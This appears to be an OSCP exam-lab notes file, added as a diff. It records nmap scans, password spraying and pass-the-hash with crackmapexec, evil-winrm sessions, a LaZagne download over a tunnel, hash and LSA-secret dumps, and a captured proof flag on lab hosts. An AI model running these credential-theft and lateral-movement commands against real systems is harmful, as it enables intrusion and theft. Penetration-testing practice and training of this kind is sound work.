@@ -1,0 +1,2242 @@
+				OSCP C
+--------------------------------------------------------------------------------------------------
+                                # IPS:
+# INTERNAL 
+10.10.176.152 - DC01 OS
+10.10.176.154 - MS02 OS 
+
+# EXTERNAL
+192.168.216.153 - MS01 OS 
+192.168.216.156 - Frankfurt OS
+192.168.216.157 - Charlie OS 
+192.168.216.155 - Pascha OS 
+
+--------------------------------------------------------------------------------------------------
+                              	AD SET:
+--------------------------------------------------------------------------------------------------
+			10.10.176.152 - DC01 OS
+DNS: 53
+HTTP: 5985
+KERERBOS: 88
+LDAP: 389 3268
+RPC: 135
+SMB: 139 445
+				NMAP: TCP
+┌──(kali㉿kali)-[~]
+└─$ nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- 10.10.143.152
+
+DNS: 53
+53/tcp    open  domain        syn-ack Simple DNS Plus
+
+HTTP: 5985
+5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+
+KERERBOS: 88
+88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2024-05-13 06:46:24Z)
+
+LDAP: 389 3268
+389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: oscp.exam0., Site: Default-First-Site-Name)
+3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: oscp.exam0., Site: Default-First-Site-Name)
+
+RPC: 135
+135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
+49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49677/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
+49678/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49681/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49705/tcp open  msrpc         syn-ack Microsoft Windows RPC
+64005/tcp open  msrpc         syn-ack Microsoft Windows RPC
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+SMB: 139 445
+139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds? syn-ack
+Host script results:
+|_clock-skew: -2s
+| nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:ab:07:b0 (VMware)
+| Names:
+|   DC01<20>             Flags: <unique><active>
+|   DC01<00>             Flags: <unique><active>
+|   OSCP<00>             Flags: <group><active>
+|   OSCP<1c>             Flags: <group><active>
+|   OSCP<1b>             Flags: <unique><active>
+| Statistics:
+|   00:50:56:ab:07:b0:00:00:00:00:00:00:00:00:00:00:00
+|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
+|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
+| smb2-time: 
+|   date: 2024-05-13T06:47:20
+|_  start_date: N/A
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 48846/tcp): CLEAN (Timeout)
+|   Check 2 (port 41810/tcp): CLEAN (Timeout)
+|   Check 3 (port 26705/udp): CLEAN (Timeout)
+|   Check 4 (port 40839/udp): CLEAN (Timeout)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+
+464/tcp   open  kpasswd5?     syn-ack
+593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped    syn-ack
+3269/tcp  open  tcpwrapped    syn-ack
+9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
+
+				NMAP: UDP
+sudo nmap -sU -O 10.10.143.152
+
+--------------------------------------------------------------------------------------------------
+			10.10.176.154 - MS02 OS 
+HTTP: 5985 47001
+SMB: 139 445
+MSSQL: 1433 49700
+RPC: 135
+				NMAP: TCP
+┌──(kali㉿kali)-[~]
+└─$ nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- 10.10.143.154
+
+HTTP: 5985 47001
+5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+47001/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+
+MSSQL: 1433 49700
+1433/tcp  open  ms-sql-s      syn-ack Microsoft SQL Server 2019 15.00.2000.00; RTM
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Issuer: commonName=SSL_Self_Signed_Fallback
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2024-03-29T18:41:12
+| Not valid after:  2054-03-29T18:41:12
+| MD5:   fb3a:aeb9:7307:f09a:3944:3100:bea3:57e2
+| SHA-1: 87f2:6ae2:4a7a:e538:e9e2:28c5:61c8:8ce2:95f0:1345
+| -----BEGIN CERTIFICATE-----
+|_-----END CERTIFICATE-----
+|_ssl-date: 2024-05-13T06:46:29+00:00; -2s from scanner time.
+| ms-sql-info: 
+|   10.10.143.154:1433: 
+|     Version: 
+|       name: Microsoft SQL Server 2019 RTM
+|       number: 15.00.2000.00
+|       Product: Microsoft SQL Server 2019
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 1433
+| ms-sql-ntlm-info: 
+|   10.10.143.154:1433: 
+|     Target_Name: OSCP
+|     NetBIOS_Domain_Name: OSCP
+|     NetBIOS_Computer_Name: MS02
+|     DNS_Domain_Name: oscp.exam
+|     DNS_Computer_Name: MS02.oscp.exam
+|     DNS_Tree_Name: oscp.exam
+|_    Product_Version: 10.0.19041
+
+49700/tcp open  ms-sql-s      syn-ack Microsoft SQL Server 2019 15.00.2000.00; RTM
+| ms-sql-info: 
+|   10.10.143.154:49700: 
+|     Version: 
+|       name: Microsoft SQL Server 2019 RTM
+|       number: 15.00.2000.00
+|       Product: Microsoft SQL Server 2019
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 49700
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Issuer: commonName=SSL_Self_Signed_Fallback
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2024-03-29T18:41:12
+| Not valid after:  2054-03-29T18:41:12
+| MD5:   fb3a:aeb9:7307:f09a:3944:3100:bea3:57e2
+| SHA-1: 87f2:6ae2:4a7a:e538:e9e2:28c5:61c8:8ce2:95f0:1345
+|_-----END CERTIFICATE-----
+|_ssl-date: 2024-05-13T06:46:29+00:00; -1s from scanner time.
+| ms-sql-ntlm-info: 
+|   10.10.143.154:49700: 
+|     Target_Name: OSCP
+|     NetBIOS_Domain_Name: OSCP
+|     NetBIOS_Computer_Name: MS02
+|     DNS_Domain_Name: oscp.exam
+|     DNS_Computer_Name: MS02.oscp.exam
+|     DNS_Tree_Name: oscp.exam
+|_    Product_Version: 10.0.19041
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+RPC: 135
+135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
+49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49669/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49670/tcp open  msrpc         syn-ack Microsoft Windows RPC
+
+SMB: 139 445
+139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds? syn-ack
+Host script results:
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 32267/tcp): CLEAN (Timeout)
+|   Check 2 (port 59423/tcp): CLEAN (Timeout)
+|   Check 3 (port 31804/udp): CLEAN (Timeout)
+|   Check 4 (port 34609/udp): CLEAN (Timeout)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| smb2-time: 
+|   date: 2024-05-13T06:45:49
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+| nbstat: NetBIOS name: MS02, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:ab:f7:64 (VMware)
+| Names:
+|   MS02<20>             Flags: <unique><active>
+|   MS02<00>             Flags: <unique><active>
+|   OSCP<00>             Flags: <group><active>
+| Statistics:
+|   00:50:56:ab:f7:64:00:00:00:00:00:00:00:00:00:00:00
+|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
+|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
+|_clock-skew: mean: -1s, deviation: 0s, median: -2s
+
+
+				NMAP: UDP
+sudo nmap -sU -O 10.10.143.154
+
+
+				SPRAY AND PRAY: 
+10.10.143.152
+10.10.143.154
+
+Support:Freedom1
+Administrator:December31
+Mary.Williams:1002:aad3b435b51404eeaad3b435b51404ee:9a3121977ee93af56ebd0ef4f527a35e:::
+				SMB:
+┌──(kali㉿kali)-[~]
+└─$ crackmapexec smb 10.10.143.152 -u support -p 'Freedom1' -d oscp.exam --shares
+SMB         10.10.143.152   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:oscp.exam) (signing:True) (SMBv1:False)
+SMB         10.10.143.152   445    DC01             [-] oscp.exam\Support:Freedom1 STATUS_LOGON_FAILURE 
+                                                                                                  
+┌──(kali㉿kali)-[~]
+└─$ crackmapexec smb 10.10.143.154 -u support -p 'Freedom1' -d oscp.exam --shares
+SMB         10.10.143.154   445    MS02             [*] Windows 10 / Server 2019 Build 19041 x64 (name:MS02) (domain:oscp.exam) (signing:False) (SMBv1:False)
+SMB         10.10.143.154   445    MS02             [-] oscp.exam\Support:Freedom1 STATUS_LOGON_FAILURE 
+
+┌──(kali㉿kali)-[~]
+└─$ crackmapexec smb 10.10.143.152 -u administrator -p 'December31' -d oscp.exam --shares
+SMB         10.10.143.152   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:oscp.exam) (signing:True) (SMBv1:False)
+SMB         10.10.143.152   445    DC01             [-] oscp.exam\Administrator:December31 STATUS_LOGON_FAILURE 
+                                                                                                  
+┌──(kali㉿kali)-[~]
+└─$ crackmapexec smb 10.10.143.154 -u administrator -p 'December31' -d oscp.exam --shares
+SMB         10.10.143.154   445    MS02             [*] Windows 10 / Server 2019 Build 19041 x64 (name:MS02) (domain:oscp.exam) (signing:False) (SMBv1:False)
+SMB         10.10.143.154   445    MS02             [-] oscp.exam\Administrator:December31 STATUS_LOGON_FAILURE 
+
+				WINRM:
+┌──(kali㉿kali)-[~]
+└─$ crackmapexec winrm 10.10.143.152 -u administrator -p 'December31' -d oscp.exam --continue-on-success
+HTTP        10.10.143.152   5985   10.10.143.152    [*] http://10.10.143.152:5985/wsman
+WINRM       10.10.143.152   5985   10.10.143.152    [-] oscp.exam\administrator:December31
+                                                                                                  
+┌──(kali㉿kali)-[~]
+└─$ crackmapexec winrm 10.10.143.154 -u administrator -p 'December31' -d oscp.exam --continue-on-success
+HTTP        10.10.143.154   5985   10.10.143.154    [*] http://10.10.143.154:5985/wsman
+WINRM       10.10.143.154   5985   10.10.143.154    [-] oscp.exam\administrator:December31
+                           
+                                                                 
+┌──(kali㉿kali)-[~]
+└─$ crackmapexec winrm 10.10.143.152 -u support -p 'Freedom1' -d oscp.exam --continue-on-success
+HTTP        10.10.143.152   5985   10.10.143.152    [*] http://10.10.143.152:5985/wsman
+WINRM       10.10.143.152   5985   10.10.143.152    [-] oscp.exam\support:Freedom1
+                                                                                                  
+┌──(kali㉿kali)-[~]
+└─$ crackmapexec winrm 10.10.143.154 -u support -p 'Freedom1' -d oscp.exam --continue-on-success
+HTTP        10.10.143.154   5985   10.10.143.154    [*] http://10.10.143.154:5985/wsman
+WINRM       10.10.143.154   5985   10.10.143.154    [-] oscp.exam\support:Freedom1
+                                                                                      
+crackmapexec smb 10.10.143.152 -u pat -H 9a3121977ee93af56ebd0ef4f527a35e -d oscp.exam --shares
+crackmapexec smb 10.10.143.154 -u pat -H 9a3121977ee93af56ebd0ef4f527a35e -d oscp.exam --shares
+
+crackmapexec winrm 10.10.143.152 -u Mary.Williams -H 9a3121977ee93af56ebd0ef4f527a35e -d oscp.exam --continue-on-success
+crackmapexec winrm 10.10.143.154 -u Mary.Williams -H 9a3121977ee93af56ebd0ef4f527a35e -d oscp.exam --continue-on-success
+
+
+				HTTP: 5985 47001
+http://10.10.143.154:5985/
+HTTP Error 404. The requested resource is not found.
+
+http://10.10.143.154:47001/
+HTTP Error 404. The requested resource is not found.
+
+
+				MSSQL: 1433 49700
+|     DNS_Domain_Name: oscp.exam
+|     DNS_Computer_Name: MS02.oscp.exam
+
+impacket-mssqlclient -p 49700 Administrator:December31@10.10.143.154 -windows-auth
+impacket-mssqlclient -p 1433 Administrator:December31@10.10.143.154 -windows-auth
+
+impacket-mssqlclient -p 49700 Administrator@MS02 -windows-auth
+impacket-mssqlclient -p 1433 Administrator@MS02 -windows-auth
+
+impacket-mssqlclient -p 49700 support:Freedom1@10.10.143.154 -windows-auth
+impacket-mssqlclient -p 1433 support:Freedom1@10.10.143.154 -windows-auth
+
+
+				SMB: 139 445
+impacket-smbclient support@10.10.143.154
+Support:Freedom1
+
+impacket-smbclient administrator@10.10.143.154
+Administrator:December31
+
+STATUS_LOGON_FAILURE
+
+			ACCESS: Administrator 
+┌──(kali㉿kali)-[~]
+└─$ evil-winrm -i 10.10.143.154 -u Administrator -p hghgib6vHT3bVWf 
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+ms02\administrator
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> hostname
+MS02
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> net users
+User accounts for \\
+-------------------------------------------------------------------------------
+Administrator            DefaultAccount           Guest
+WDAGUtilityAccount
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> net users /domain
+The request will be processed at a domain controller for domain oscp.exam.
+net.exe : System error 5 has occurred.
+    + CategoryInfo          : NotSpecified: (System error 5 has occurred.:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+
+
+				NETWORK: 
+*Evil-WinRM* PS C:\Users\Administrator\Documents> ipconfig /all
+Windows IP Configuration
+   Host Name . . . . . . . . . . . . : MS02
+   Primary Dns Suffix  . . . . . . . : oscp.exam
+   Node Type . . . . . . . . . . . . : Hybrid
+   IP Routing Enabled. . . . . . . . : No
+   WINS Proxy Enabled. . . . . . . . : No
+   DNS Suffix Search List. . . . . . : oscp.exam
+Ethernet adapter Ethernet0:
+   Connection-specific DNS Suffix  . :
+   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
+   Physical Address. . . . . . . . . : 00-50-56-AB-F7-64
+   DHCP Enabled. . . . . . . . . . . : No
+   Autoconfiguration Enabled . . . . : Yes
+   IPv4 Address. . . . . . . . . . . : 10.10.143.154(Preferred)
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 10.10.143.254
+   DNS Servers . . . . . . . . . . . : 10.10.143.152
+   NetBIOS over Tcpip. . . . . . . . : Enabled
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> arp -A
+Interface: 10.10.143.154 --- 0x6
+  Internet Address      Physical Address      Type
+  10.10.143.152         00-50-56-ab-07-b0     dynamic
+  10.10.143.153         00-50-56-ab-d4-fa     dynamic
+  10.10.143.255         ff-ff-ff-ff-ff-ff     static
+  224.0.0.22            01-00-5e-00-00-16     static
+  224.0.0.251           01-00-5e-00-00-fb     static
+  239.255.255.250       01-00-5e-7f-ff-fa     static
+
+
+				# File Transfers: 
+sudo ip route add 240.0.0.1/32 dev ligolo
+listener_add --addr 0.0.0.0:1237 --to 127.0.0.1:8000
+python3 -m http.server 8000
+[Agent : MS01\Administrator@MS01] » ifconfig
+
+iwr -uri http://10.10.143.153:1237/LaZagne.exe -Outfile laz.exe
+
+
+				CREDS / HASHES: 
+┌──(kali㉿kali)-[~/Desktop/WINDOWS-PRIV]
+└─$ python3 -m http.server 80
+
+# LaZagne: 
+.\laz.exe all
+
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> .\laz.exe all
+|====================================================================|
+|                                                                    |
+|                        The LaZagne Project                         |
+|                                                                    |
+|                          ! BANG BANG !                             |
+|                                                                    |
+|====================================================================|
+[+] System masterkey decrypted for 2c18f25f-31e6-4614-b0b7-5db81824f752
+[+] System masterkey decrypted for 98e7f77d-8897-4d55-935d-61f8a68c56ec
+[+] System masterkey decrypted for b2439a16-984e-4953-bfb8-4bcfb408d4d4
+[+] System masterkey decrypted for bdba25ce-60c3-4414-bd18-0b98d962eb85
+########## User: SYSTEM ##########
+------------------- Hashdump passwords -----------------
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:507e8b20766f720619e9f33d73756b34:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:11ba4cb6993d434d8dbba9ba45fd9011:::
+------------------- Pypykatz passwords -----------------
+[+] Shahash found !!!
+Shahash: e70690512b3856e7bb77fd9c8f52b711242e2e7f
+Nthash: 22f8aba36d4762874cd727d5a4c17502
+Login: MS02$
+[+] Shahash found !!!
+Shahash: f41a495e6d341c7416a42abd14b9aef6f1eb6b17
+Nthash: 59b280ba707d22e3ef0aa587fc29ffe5
+Login: Administrator
+------------------- Lsa_secrets passwords -----------------
+$MACHINE.ACC
+0000   F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
+0010   96 D8 AC D7 41 BB 43 36 93 79 D0 DC 41 4E F3 09    ....A.C6.y..AN..
+0020   63 C4 94 EE 12 A1 81 8E 3B A0 B3 85 38 7A 82 93    c.......;...8z..
+0030   23 0C 6E D1 4F A7 A1 45 34 97 ED 1B 4A 98 C2 0F    #.n.O..E4...J...
+0040   F6 EE 19 2D 74 B2 06 03 E3 BE D0 78 5C 72 18 8B    ...-t......x.r..
+0050   89 73 83 1A 45 C5 B9 6F 82 6F 46 3F 87 E1 82 31    .s..E..o.oF?...1
+0060   57 C1 ED C2 4C 9E 3F C1 33 04 0D A6 40 B3 FC 7B    W...L.?.3...@..{
+0070   DD 70 46 F4 1B F6 1A 4F 8C BF C4 E0 27 B4 74 00    .pF....O....'.t.
+0080   C1 D0 83 23 B2 9D A6 A3 6C F9 2F 86 46 0C 77 11    ...#....l./.F.w.
+0090   53 01 70 50 31 01 75 F9 DD 4C F4 66 2C BC 4C 31    S.pP1.u..L.f,.L1
+00A0   2C 62 45 B6 27 52 5D A6 57 A8 1F E6 AD B5 40 EE    ,bE.'R].W.....@.
+00B0   0F F8 C2 3F 7A 09 CA C8 6C 5E 66 65 AE C7 C2 C4    ...?z...l^fe....
+00C0   CC D6 2D 23 2B 34 26 2E 12 03 D4 CC 21 59 9A 41    ..-#+4&.....!Y.A
+00D0   D9 15 5C A9 40 0F 52 DC 9A 05 02 AB 96 75 24 A6    ....@.R......u$.
+00E0   2D FE C5 CB C0 7C 18 81 76 63 A5 93 DA 94 05 B8    -....|..vc......
+00F0   3B 9E A9 D9 D9 F9 BF C6 F4 B9 06 7C A6 97 59 9C    ;..........|..Y.
+0100   BE 5A DD C2 AE 37 0E 24 EA 12 3D 8D AC C1 91 A4    .Z...7.$..=.....
+DefaultPassword
+0000   1E 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
+0010   37 00 54 00 67 00 39 00 4D 00 39 00 4D 00 5A 00    7.T.g.9.M.9.M.Z.
+0020   62 00 7A 00 41 00 6F 00 6B 00 52 00 39 00 00 00    b.z.A.o.k.R.9...
+DPAPI_SYSTEM
+0000   01 00 00 00 2D C3 50 E5 32 DB 54 AF E6 33 96 A2    ....-.P.2.T..3..
+0010   5C B0 8A 5F E4 82 96 B1 A2 C5 9C 40 8E 14 1C DF    ..._.......@....
+0020   BA 0E 45 40 90 68 85 74 2B 49 3C A4                ..E@.h.t+I<.
+NL$KM
+0000   40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    @...............
+0010   F1 9F 8D 0A 3D 6B 2D 13 69 96 2E 4C 32 4D C3 66    ....=k-.i..L2M.f
+0020   D5 36 97 AB 1F 0B F2 38 11 3E DF 05 AE DF 31 70    .6.....8.>....1p
+0030   C0 E3 97 A0 08 31 A9 2A E3 88 48 DD 2C 88 86 56    .....1.*..H.,..V
+0040   83 C9 79 90 03 D5 9D 28 C1 BE 33 D6 0E 7B B7 9B    ..y....(..3..{..
+0050   ED F3 97 0C 53 FB 3C 67 01 9F 30 17 F7 58 4C 7C    ....S.<g..0..XL|
+_SC_MSSQL$SQLEXPRESS
+0000   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
+0010   9A 04 44 62 60 37 6A F2 FF D1 05 01 30 19 17 18    ..Db`7j.....0...
+_SC_SQLTELEMETRY$SQLEXPRESS
+0000   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
+0010   15 7B 2B E0 C9 77 19 EA 7B 56 FC F7 6B 85 C5 D3    .{+..w..{V..k...
+[+] 2 passwords have been found.
+
+
+				WINRM: ACCESS
+┌──(kali㉿kali)-[~]
+└─$ evil-winrm -i 10.10.143.152 -u Administrator -H 59b280ba707d22e3ef0aa587fc29ffe5
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls
+    Directory: C:\Users\Administrator\Desktop
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        5/12/2024   8:25 PM             34 proof.txt
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat proof.txt
+36fff30284344dbfe4bdab670fa7ab5d
+
+
+--------------------------------------------------------------------------------------------------
+				STANDALONE: 
+--------------------------------------------------------------------------------------------------
+			192.168.216.153 - MS01 OS 
+SSH: 22
+HTTP: 5985 8000 47001
+RPC: 135
+SMB: 139 445
+???: 5040
+				NMAP: TCP
+┌──(kali㉿kali)-[~]
+└─$ nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- 192.168.216.153
+
+SSH: 22
+22/tcp    open  ssh           syn-ack OpenSSH for_Windows_8.1 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 e0:3a:63:4a:07:83:4d:0b:6f:4e:8a:4d:79:3d:6e:4c (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDHi6qqQGQteAgLLakGf2MPORvtZSeF1gAL03sfUo/E/jsObuAOjzHPfw1OIfAyctU/gv17d0sz17kGDXbg4In4vxlnavXxnB/L2ipQLhAkFLo1YZLLwyUs0j1jiSW65Ax12A20nH0F3hbuqKsuWIPywR9XXc0cwhyY3ET06ZCbVVvP8ChGMd97uZTDeZtrnskYMXmqnfQpOGPL6e022+K5ud3MboyYXTlD0rGyVHyLCCXeg9QdxsVR5mZ8hSVCrwdX8Q4tb4kLYi+wpPx1KCirHEk/8O8I7YuA5KR4AeaMVSlqUhlm9MXaNw+5WZD2xOue0ZPCx2gxgKgndoUDfAagZrHr3dzgMUDgUnKTbtL/EIZdyzKh5C1TrN+yplSpqYjK975Q1qas7SUmzanN9S/PnhFFer/0j6hTtGlRalbxX12i2ifC0314ifnHY3Zz+2VD49RARArwvZR+7KcGKP+5tpCl9IyVf1xSKFFnJ0cQdhuAgJnkCfQXaQLHTzqSbys=
+|   256 3f:16:ca:33:25:fd:a2:e6:bb:f6:b0:04:32:21:21:0b (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOpOTM37eUD8SUKAqFVSNV8ECDl5yUqV7a41c39cXyPE6EMeNbKxWvQDoTw+WEYArHFAEj3SZbFupIZoZmvjFuA=
+|   256 fe:b0:7a:14:bf:77:84:9a:b3:26:59:8d:ff:7e:92:84 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICyZUVdHOqTpEFyvELlmc7sCN1XFXQo7RdZdTRTPO2uJ
+
+HTTP: 5985 8000 47001
+5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+8000/tcp  open  http          syn-ack Microsoft IIS httpd 10.0
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-title: IIS Windows
+47001/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+
+RPC: 135
+135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
+49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49669/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49670/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49671/tcp open  msrpc         syn-ack Microsoft Windows RPC
+
+SMB: 139 445
+139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds? syn-ack
+Host script results:
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 20121/tcp): CLEAN (Couldn't connect)
+|   Check 2 (port 8148/tcp): CLEAN (Couldn't connect)
+|   Check 3 (port 17482/udp): CLEAN (Timeout)
+|   Check 4 (port 36062/udp): CLEAN (Timeout)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+|_clock-skew: -3s
+| smb2-time: 
+|   date: 2024-05-12T04:43:19
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+
+5040/tcp  open  unknown       syn-ack
+
+				NMAP: UDP
+┌──(kali㉿kali)-[~]
+└─$ sudo nmap -sU -O 192.168.216.153
+123/udp  open|filtered ntp
+137/udp  open|filtered netbios-ns
+138/udp  open|filtered netbios-dgm
+500/udp  open|filtered isakmp
+1900/udp open|filtered upnp
+4500/udp open|filtered nat-t-ike
+5050/udp open|filtered mmcc
+5353/udp open|filtered zeroconf
+5355/udp open|filtered llmnr
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Microsoft Windows 2008, Novell NetWare 6.X
+OS CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1 cpe:/o:novell:netware:6.5
+OS details: Microsoft Windows Server 2008 R2 SP1, Novell NetWare 6.5
+
+
+				RPC: 135
+rpcclient -U "" -N 192.168.183.153
+Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED
+
+				SMB: 139 445
+192.168.183.153
+smbclient -L //192.168.183.153
+smbclient -NL //192.168.183.153
+session setup failed: NT_STATUS_ACCESS_DENIED
+
+smbmap -H 192.168.183.153
+enum4linux -n 192.168.183.153
+enum4linux -a 192.168.183.153
+
+				???: 5040
+PORT 5040: This is a local "scratch" port, used for emails, news clients, and web
+
+
+
+			HTTP: 5985 8000 47001
+http://192.168.183.153:47001/
+Microsoft IIS httpd 10.0
+
+http://192.168.183.153:8000/
+feroxbuster -u http://192.168.183.153:8000/ -t 30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -e 
+
+200      GET      359l     2112w   178556c http://192.168.183.153:8000/iisstart.png
+200      GET       32l       54w      696c http://192.168.183.153:8000/
+301      GET        2l       10w      159c http://192.168.183.153:8000/partner => http://192.168.183.153:8000/partner/
+400      GET       82l      279w     3490c http://192.168.183.153:8000/*checkout*
+400      GET       82l      279w     3490c http://192.168.183.153:8000/*checkout*.aspx
+301      GET        2l       10w      159c http://192.168.183.153:8000/Partner => http://192.168.183.153:8000/Partner/
+400      GET       82l      279w     3490c http://192.168.183.153:8000/*docroot*
+400      GET       82l      279w     3490c http://192.168.183.153:8000/*docroot*.aspx
+400      GET       82l      279w     3490c http://192.168.183.153:8000/*
+400      GET       82l      279w     3490c http://192.168.183.153:8000/*.aspx
+400      GET       82l      279w     3490c http://192.168.183.153:8000/http%3A%2F%2Fwww
+400      GET       82l      279w     3490c http://192.168.183.153:8000/http%3A%2F%2Fwww.aspx
+400      GET       82l      279w     3490c http://192.168.183.153:8000/http%3A
+400      GET       82l      279w     3490c http://192.168.183.153:8000/http%3A.aspx
+404      GET       42l      161w     1940c http://192.168.183.153:8000/The%20Beatles%20-%20Abbey%20Road.aspx
+404      GET       42l      160w     1950c http://192.168.183.153:8000/Oasis%20-%20'Definitely%20Maybe'.aspx
+400      GET       82l      279w     3490c http://192.168.183.153:8000/q%26a
+400      GET       82l      279w     3490c http://192.168.183.153:8000/q%26a.aspx
+400      GET       82l      279w     3490c http://192.168.183.153:8000/**http%3a
+400      GET       82l      279w     3490c http://192.168.183.153:8000/**http%3a.aspx
+400      GET       82l      279w     3490c http://192.168.183.153:8000/*http%3A
+400      GET       82l      279w     3490c http://192.168.183.153:8000/*http%3A.aspx
+404      GET       42l      158w     1926c http://192.168.183.153:8000/web%20design.aspx
